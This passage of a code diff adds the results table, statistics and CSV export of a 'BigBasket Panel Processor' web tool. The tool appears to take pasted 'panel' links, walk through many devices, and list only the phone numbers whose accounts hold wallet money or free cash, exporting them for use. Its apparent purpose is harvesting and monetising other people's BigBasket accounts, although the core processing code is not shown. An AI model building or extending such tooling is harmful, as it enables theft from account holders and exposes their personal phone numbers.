+        tag.appendChild(label);
+        if (p.devices && p.devices.length) {
+            const count = document.createTextNode(` (${p.devices.length})`);
+            tag.appendChild(count);
+        }
+        container.appendChild(tag);
+    });
+    panelCount.textContent = `${state.panels.length} panels`;
+}
+
+function updateStats() {
+    totalDevices.textContent = state.totalDevices;
+    doneDevices.textContent = state.processedDevices;
+    
+    const cash = state.results.filter(r => r.status === 'cash' || r.status === 'wallet');
+    cashDevices.textContent = cash.length;
+    
+    let walletSum = 0, freeSum = 0, err = 0;
+    for (const r of state.results) {
+        walletSum += r.wallet || 0;
+        freeSum += r.freecash || 0;
+        if (r.status === 'error') err++;
+    }
+    totalWallet.textContent = walletSum.toFixed(0);
+    totalFreecash.textContent = freeSum.toFixed(0);
+    errorDevices.textContent = err;
+}
+
+function updateResults() {
+    const tbody = resultBody;
+    tbody.innerHTML = '';
+    if (state.results.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No results yet</td></tr>';
+        resultCount.textContent = '0';
+        return;
+    }
+    
+    // Show only cash results
+    const cashResults = state.results.filter(r => r.status === 'cash' || r.status === 'wallet');
+    resultCount.textContent = cashResults.length;
+    
+    if (cashResults.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No cash found yet</td></tr>';
+        return;
+    }
+    
+    cashResults.forEach((r, i) => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td>${i+1}</td>
+            <td style="font-size:11px;color:#888;">${r.panel.substring(0, 30)}...</td>
+            <td style="font-size:11px;color:#888;">${r.deviceId.substring(0, 12)}</td>
+            <td><strong>${r.phone}</strong></td>
+            <td>${r.wallet > 0 ? `<span class="wallet-badge">₹${r.wallet}</span>` : '—'}</td>
+            <td>${r.freecash > 0 ? `<span class="cash-badge">₹${r.freecash}</span>` : '—'}</td>
+            <td style="color:${r.status === 'cash' ? '#f39c12' : '#2ecc71'}">${r.status === 'cash' ? '💰 Cash' : '💳 Wallet'}</td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+
+// ============================================================
+// EXPORT
+// ============================================================
+function exportCSV() {
+    const cashResults = state.results.filter(r => r.status === 'cash' || r.status === 'wallet');
+    if (cashResults.length === 0) {
+        addLog('⚠️ No cash results to export', 'warning');
+        return;
+    }
+    let csv = 'Panel,Device ID,Phone,Wallet,FreeCash,Status\n';
+    for (const r of cashResults) {
+        csv += `"${r.panel}","${r.deviceId}","${r.phone}",${r.wallet},${r.freecash},"${r.status}"\n`;
+    }
+    const blob = new Blob([csv], { type: 'text/csv' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `bigbasket_cash_${new Date().toISOString().slice(0,10)}.csv`;
+    a.click();
+    URL.revokeObjectURL(url);
+    addLog(`📥 Exported ${cashResults.length} cash results to CSV`, 'success');
+}
+
+// ============================================================
+// EVENT LISTENERS
+// ============================================================
+startBtn.addEventListener('click', runProcessor);
+
+clearBtn.addEventListener('click', () => {
+    panelInput.value = '';
+    state.panels = [];
+    updatePanelTags();
+    clearLog();
+    addLog('🧹 Cleared panel input', 'info');
+});
+
+clearResultsBtn.addEventListener('click', () => {
+    state.results = [];
+    state.totalDevices = 0;
+    state.processedDevices = 0;
+    updateStats();
+    updateResults();
+    progressBar.style.width = '0%';
+    addLog('🧹 Cleared results', 'info');
+});
+
+exportBtn.addEventListener('click', exportCSV);
+
+// Auto-detect panels on input
+panelInput.addEventListener('input', () => {
+    const text = panelInput.value;
+    const parsed = parsePanels(text);
+    state.panels = parsed.map((p, i) => ({
+        id: i,
+        ...p,
+        status: 'pending',
+        devices: [],
+        currentIndex: 0,
+    }));
+    updatePanelTags();
+    if (parsed.length > 0) {
+        addLog(`📋 Detected ${parsed.length} panel(s)`, 'panel');
+    }
+});
+
+// Initial state
+addLog('💡 Paste panel links and click Start', 'info');
+updatePanelTags();
+updateStats();
+updateResults();
+
+// Handle abort via double-click on start (or we can add a stop button)
+let stopHandler = null;
+startBtn.addEventListener('dblclick', () => {
+    if (state.running) {
+        state.abort = true;
+        addLog('⏹️ Stopping... (will finish current device)', 'warning');
+    }
+});
+
+console.log('🛒 BigBasket Panel Processor loaded');
+</script>
+</body>
+</html>
